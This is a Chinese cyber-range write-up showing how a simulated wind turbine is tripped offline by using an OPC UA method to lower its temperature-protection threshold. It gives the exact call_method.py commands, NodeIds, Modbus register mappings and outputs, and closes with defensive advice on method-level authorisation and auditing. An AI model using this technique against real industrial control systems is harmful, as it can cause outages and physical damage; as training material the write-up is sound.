## 一句话概括

攻击者没有发"停机"命令，他只是把风机的温度保护阈值从 95 改成了 40，剩下的事情由风机自己的保护逻辑完成：设备"合法地"把自己停了。

## 原理

### Method 是什么

在 OPC UA 地址空间里，Method 是一类特殊节点：不承载数值，而是服务端主动暴露、可被远程调用的功能。客户端通过 `Call` 服务执行它，请求里要指明"在哪个对象上调哪个方法"以及"传什么参数"。

```text
Object（对象）       Protection
  ├── TemperatureLimit      Variable，可读，代表当前阈值
  └── SetTemperatureLimit   Method，可调用，用来改阈值
```

这是 OPC UA 相对纯数据协议的关键差异：Modbus 只能读写寄存器，语义全靠外部点表解释；OPC UA 把"改温度阈值"直接建模成带名字、带参数、带返回值的可调用方法。工程上更好用，安全上则多了一个需要单独授权的控制面。

### 参数与返回值

`Call` 的通用结构：

```text
请求
  ObjectId          对象节点
  MethodId          方法节点，例如
                    ns=2;s=WindFarm.Offshore.Turbine08.Protection.SetTemperatureLimit
  InputArguments    入参列表，每项带类型和值

响应
  StatusCode        方法级执行结果
  OutputArguments   出参列表
```

注意：入参是有类型的，传 `40` 还是 `40.0` 在某些实现里行为不同。海上链的客户端工具因此提供了两种写法：

```bash
# 写法一：--value，工具内部按方法签名转成 Double
--node "ns=2;s=WindFarm.Offshore.Turbine08.Protection.SetTemperatureLimit" --value 40

# 写法二：--arg，显式声明类型
--arg Double:40.0

# 无参方法用 --no-arg；--method 与 --node 是同义参数名
--node "ns=2;s=WindFarm.Offshore.Turbine08.Protection.ResetProtection" --no-arg
```

07-25 部署记录里客户端还支持 `--debug` 打印过程，实际使用时以目标机器上的工具版本为准。

## 结构

### 从 OPC UA 到 Modbus 的落地路径

Method Call 会真的往物理设备侧的寄存器写值：

```text
维护工作站 offshore-maint-ws
  └── opcua-tools/call_method.py
        └── OPC UA Call 服务
              └── offshore-opcua-gateway (10.0.12.8:4840)
                    ├── 1. 先读 WT08 Modbus 子站当前温度与阈值
                    ├── 2. 真实 Modbus TCP FC06 写 HR96 = new_limit
                    ├── 3. 重新读取 WT08 状态
                    └── 4. 若当前温度 > HR96，则进入 PROTECTION_STOP
                          └── offshore-wt08-modbus-sim
                                HR96 temperature_limit_c
                                HR94 reset
```

`SetTemperatureLimit(new_limit)` 在网关里的执行逻辑（部署记录原文归纳）：

```text
1. 从 WT08 Modbus 子站读取当前温度和阈值。
2. 使用真实 Modbus TCP FC06 写 HR96 = new_limit。
3. 重新读取 WT08 状态。
4. 若当前温度 > HR96，则 WT08 进入 PROTECTION_STOP / OFF_GRID / TEMP_THRESHOLD_TRIP。
5. OPC UA 节点和 HTTP 状态接口同步更新。

ResetProtection()：FC06 写 HR94=1 -> 清除告警、HR96 恢复 95 -> 恢复 RUNNING / ON_GRID
```

关键点：整个调用链没有用 HTTP 控制接口替代 OPC UA 或 Modbus，这是靶场刻意设置的约束，保证玩家练的是真实工控协议的调用链，而不是一个 REST 包装。

### 为什么改阈值等于停机

风机的保护逻辑本身完全正常：

```text
if 当前温度 > 阈值:
    保护动作 -> 停机、脱网、功率归零、告警
```

这是真实机组都必须有的安全设计。攻击者不破坏这个逻辑，只是把输入条件改掉：

```text
改前：73.0 > 95.0 不成立 -> 正常运行
改后：73.0 > 40.0 成立   -> 保护停机
```

所以最终的业务影响是"设备按设计响应了一次它认为真实的越限"，这类手法在 MITRE ATT&CK for ICS 中对应"损害过程控制 / 抑制响应功能"一类，而不是简单的命令执行。

## 报文/字段对照

| 层次 | 字段 | 实测值 |
|---|---|---|
| OPC UA Call 请求 | MethodId | `ns=2;s=WindFarm.Offshore.Turbine08.Protection.SetTemperatureLimit` |
| OPC UA Call 请求 | InputArguments | `Double: 40.0`（或 `--value 40`） |
| OPC UA Call 响应 | StatusCode | `Good` |
| OPC UA Call 响应 | OutputArguments[0] old_limit_c | `95.0` |
| OPC UA Call 响应 | OutputArguments[1] new_limit_c | `40.0` |
| OPC UA Call 响应 | OutputArguments[2] evaluation | `61.0 > 40.0` |
| OPC UA Call 响应 | OutputArguments[3] action | `PROTECTION_STOP` |
| Modbus | 功能码 | FC06（写单个保持寄存器） |
| Modbus | 目标寄存器 | HR96（temperature_limit_c） |
| Modbus | 复位寄存器 | HR94（ResetProtection） |
| Modbus | Unit ID | 1 |
| 业务状态 | turbine_state | `PROTECTION_STOP` |
| 业务状态 | grid_state | `OFF_GRID` |
| 业务状态 | active_power | `0.0` |
| 业务状态 | alarm | `TEMP_THRESHOLD_TRIP` |

关于 `evaluation` 的数值：温度是动态漂移量，HMI 轮询日志里 WT08 温度在 72~73 之间浮动。素材中三次调用记录的 evaluation 分别是 `65.0 > 40.0`（单机版自检）、`63.0 > 40.0`（Modbus 联动验证）、`61.0 > 40.0`（海上链攻击指南），差异来自调用时刻的实时温度，不影响结论。

## 实测过程

### HMI 侧的寄存器映射

SCADA HMI 通过轮询三台 Modbus 子站展示状态，寄存器含义：

```text
HR0  active_power_kw
HR1  reactive_power_kvar
HR2  wind_speed_mps x10
HR3  wind_direction_deg
HR4  voltage_v
HR5  current_a
HR6  temperature_c
HR7  rotor_rpm x10
HR8  pitch_angle_deg x10
HR9  grid_state
HR10 run_state
HR11 alarm_code
HR12 frequency_hz x100
HR96 temperature_limit_c     <- SetTemperatureLimit 写的就是这个
```

`HR96` 是整条链的支点：OPC UA 侧的"改阈值"和 Modbus 侧的"写寄存器"是同一个动作的两种表述。

### 攻击

在维护工作站（`offshore-maint-ws`）上执行：

```bash
/opt/windfarm/offshore-maint-ws/venv/bin/python \
  /home/remote-maintainer/opcua-tools/call_method.py \
  --node "ns=2;s=WindFarm.Offshore.Turbine08.Protection.SetTemperatureLimit" \
  --value 40
```

返回：

```text
StatusCode: Good
  old_limit_c = 95.0
  new_limit_c = 40.0
  evaluation = 61.0 > 40.0
  action = PROTECTION_STOP
StateAfterCall:
  temperature_limit=40.0
  active_power=0.0
  grid_state=OFF_GRID
  turbine_state=PROTECTION_STOP
  alarm=TEMP_THRESHOLD_TRIP
```

从攻击机侧确认最终影响：

```bash
curl -s http://10.0.11.5:8080/api/state | python3 -m json.tool | grep -A10 WT08
```

```text
WT08:
  state: PROTECTION_STOP
  grid_state: OFF_GRID
  power_kw: 0.0
  temperature_limit_c: 40.0
  alarm: TEMP_THRESHOLD_TRIP
```

验收标准：WT08 保护停机 + 脱网 + 功率归零 + 告警。三台风机对照效果：

```text
station = ALARM
WT07 = RUNNING
WT08 = PROTECTION_STOP / OFF_GRID / power 0 / temperature_limit 40 / TEMP_THRESHOLD_TRIP
WT09 = RUNNING
last_control = SetTemperatureLimit(40.0)
last_control_source = OPC UA Method Call -> Modbus TCP FC06
```

### 恢复

```bash
/opt/windfarm/offshore-maint-ws/venv/bin/python \
  /home/remote-maintainer/opcua-tools/call_method.py \
  --node "ns=2;s=WindFarm.Offshore.Turbine08.Protection.ResetProtection" \
  --no-arg
```

```text
StatusCode: Good
StateAfterCall:
  temperature_limit=95.0
  grid_state=ON_GRID
  turbine_state=RUNNING
  alarm=NONE
```

### 三台风机独立控制验证

改造后每台风机的 `SetTemperatureLimit` 只写对应子站的 HR96，`ResetProtection` 只写对应子站的 HR94：

```text
Turbine09 攻击      -> Turbine09 停机，Turbine07 / Turbine08 保持 RUNNING / ON_GRID
Turbine07 交叉验证  -> Turbine07 停机，Turbine08 / Turbine09 保持 RUNNING
收尾状态            -> WT07 / WT08 / WT09 均 RUNNING / ON_GRID / NONE，HR96=95
```

`call_method.py` 刻意不默认控制任何风机，玩家必须先用 Browse 拿到目标 Method 的 NodeId 再填入，Method Call 只影响被选择的那一台风机。

## 安全视角

- 危险的是"改安全参数的方法"，它比名字里带"停机"的方法更容易被放行。暴露 `Stop()` 防护方一眼就知道是控制面；`SetTemperatureLimit()` 看起来像"维护参数配置"，容易被当成低风险操作放行。定值类、阈值类、边界类参数的写入，必须按控制命令同等级别管控。
- 方法级授权不能省。靶场的缺陷在于"只校验登录，不校验 method 级权限"，`remote-maintainer` 这个维护角色拿到了业务控制权。正确做法是按角色维护方法白名单，维护角色只允许调诊断类方法。
- 控制面必须独立审计。`Call` 服务应记录会话身份、MethodId、入参、返回值与时间，业务侧网关日志（`OPCUA_METHOD_CALL`、`PROTECTION_STOP`）与 Modbus 写寄存器记录要能对上；样例网关把事件写进 `/var/log/windfarm/offshore-opcua-gateway/opcua-control.log`，就是最小可用的审计粒度。
- 参数合理性校验应下沉到网关。"把温度保护阈值设成低于当前温度"在任何真实机组里都不合逻辑，网关完全可以拒绝，而不是照单执行。
- 恢复路径与定值变更同样要管控。`ResetProtection` 能清告警、恢复并网，若比攻击方法更容易调用，危害会被放大（反复触发/恢复、掩盖痕迹）。真实电力系统里保护定值修改有严格流程（定值单、双人复核、变更记录），靶场简化了这一环，正好用来讲清"为什么定值必须受控"。
